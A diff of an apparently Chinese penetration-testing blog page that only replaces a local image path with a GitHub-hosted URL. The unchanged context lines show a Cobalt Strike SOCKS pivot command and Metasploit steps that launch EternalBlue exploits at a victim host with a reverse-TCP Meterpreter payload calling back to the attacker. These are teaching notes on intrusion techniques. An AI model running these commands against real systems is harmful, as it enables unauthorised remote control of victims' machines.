@@ -2323,7 +2323,7 @@
 <p>CS里</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">socks &lt;port&gt;</span><br></pre></td></tr></table></figure>
 
-<img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20210510004625495.png" alt="image-20210510004625495" style="zoom:80%;">
+<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021051013367602817e4ffb459dec55.png" alt="image-20210510004625495" style="zoom:80%;">
 
 <p>MSF里</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue_win8</span><br><span class="line">use exploit/windows/smb/ms17_010_psexec</span><br><span class="line"></span><br><span class="line">setg Proxies socks4:&lt;your host&gt;:&lt;port&gt;</span><br><span class="line">setg ReverseAllowProxy true</span><br><span class="line">set rhost &lt;victim host&gt;</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost &lt;your host&gt;</span><br><span class="line">set lport &lt;your port&gt;</span><br></pre></td></tr></table></figure>
